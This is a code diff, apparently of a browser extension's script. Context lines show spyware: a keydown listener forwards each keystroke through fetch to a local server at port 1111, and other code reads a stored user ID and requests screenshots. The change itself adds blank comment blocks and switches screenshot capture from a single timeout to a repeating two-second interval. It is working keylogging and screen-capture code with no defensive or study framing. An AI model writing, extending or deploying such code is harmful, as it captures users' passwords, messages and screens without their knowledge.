@@ -10,6 +10,19 @@ async function track() {
   }
 }
 
+/*
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ */
+
 async function sendKey(key) {
   try {
     await fetch("https://localhost:1111", {
@@ -21,6 +34,19 @@ async function sendKey(key) {
   }
 }
 
+/*
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ */
+
 function addKeypressListener() {
   window.addEventListener("keydown", (event) => {
     if (event.isComposing || event.keyCode === 229) {
@@ -29,6 +55,19 @@ function addKeypressListener() {
     sendKey(event.key);
   });
 }
+
+/*
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ */
 
 async function getLocalstorage() {
   const id = window.localStorage.getItem("userID");
@@ -45,7 +84,7 @@ async function getLocalstorage() {
 }
 
 const captureScreenshots = () => {
-  setTimeout(() => {
+  setInterval(() => {
     chrome.runtime.sendMessage({ msg: "capture" });
   }, 2000);
 };
